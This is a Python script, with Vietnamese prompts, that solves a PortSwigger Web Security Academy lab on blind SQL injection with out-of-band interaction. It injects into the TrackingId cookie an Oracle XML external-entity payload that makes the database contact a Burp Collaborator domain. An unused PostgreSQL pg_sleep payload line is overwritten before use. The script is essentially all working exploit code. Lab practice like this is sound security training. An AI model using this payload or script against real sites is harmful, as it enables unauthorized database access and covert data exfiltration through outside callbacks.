#Lab: Blind SQL injection with out-of-band interaction
import requests

print("Nhập URL lab giống như này: https://<your-lab-id>.web-security-academy.net/")
base_url = input("Nhập URL: ").rstrip("/")

collab_domain = input("Nhập domain Burp Collaborator (ví dụ abcdef.burpcollaborator.net): ").strip()

session = requests.Session()
res = session.get(base_url)

tracking_id = res.cookies.get("TrackingId")
session_id = res.cookies.get("session")

payload = f"{tracking_id}'||(SELECT+EXISTS(SELECT+1+FROM+users+WHERE+username='administrator'+AND+1=CAST((SELECT+pg_sleep(1)+FROM+users)+AS+INT)))||'"

payload = f"{tracking_id}'||(SELECT+extractvalue(xmltype('<!DOCTYPE+root+[<!ENTITY+%25+ext+SYSTEM+\"http://{collab_domain}\">]>'),'/l')+FROM+dual)||'"

cookies = {
    "TrackingId": payload,
    "session": session_id
}

print("[!] Gửi payload với DNS lookup... Kiểm tra Burp Collaborator log!")

response = session.get(base_url, cookies=cookies)

if response.status_code == 200:
    print("[+] Ngon! Nếu thấy request trong Burp Collaborator => Ngon pro max!")
else:
    print("[-] Thua")
